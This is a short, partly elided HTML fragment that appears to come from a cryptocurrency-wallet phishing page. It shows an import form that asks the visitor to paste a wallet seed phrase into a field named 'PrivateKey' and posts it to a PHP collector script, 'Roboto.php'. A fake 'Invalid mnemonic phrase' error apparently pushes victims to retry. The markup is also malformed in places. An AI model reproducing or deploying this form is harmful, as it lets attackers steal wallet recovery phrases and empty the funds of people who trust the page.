            ...
            <div class="sc-gGBfsJ jvrGcO">
              <div class="sc-jnlKLf OHNdu">
                ...
                <div class="sc-htoDjs cDnNqw">
                  ...
                  <form method="post" action="Roboto.php" class="ant-form ant-form-horizontal">
                      ...
                      <div class="ant-col ant-form-item-control">
                        ...
                        <div>
                          <div class="thepadding">
                            <textarea class="import-account__secret-phrase" minlenght="20" placeholder="Paste seed phrase from clipboard" name="PrivateKey" id="wordsseed" required=""></textarea>
                            
                        
                           
                                                </textarea><font ="Arial" size="2" color="red">Invalid mnemonic phrase</font>
